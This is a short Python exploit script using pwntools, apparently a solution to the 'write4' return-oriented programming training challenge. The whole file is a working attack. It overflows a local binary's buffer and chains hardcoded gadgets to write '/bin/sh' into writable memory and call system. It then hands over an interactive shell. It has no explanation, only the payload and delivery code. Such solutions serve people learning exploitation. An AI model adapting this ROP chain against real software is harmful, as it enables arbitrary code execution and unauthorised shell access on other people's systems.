from pwn import *

context.log_level = 'debug'
sh = process("./write4")

pop_r14_r15 = 0x0000000000400890
mov_r14_r15  = 0x0000000000400820
pop_rdi  = 0x0000000000400893
data_addr   = 0x00601050
system_plt  = 0x004005E0

payload = cyclic(0x28)
payload += p64(pop_r14_r15)
payload += p64(data_addr)
payload += b"/bin/sh\x00"
payload += p64(mov_r14_r15)
payload +=  p64(pop_rdi)
payload += p64(data_addr)
payload += p64(0x04005b9)
payload += p64(system_plt)


sh.recvuntil('>')
sh.sendline(payload)
sh.interactive()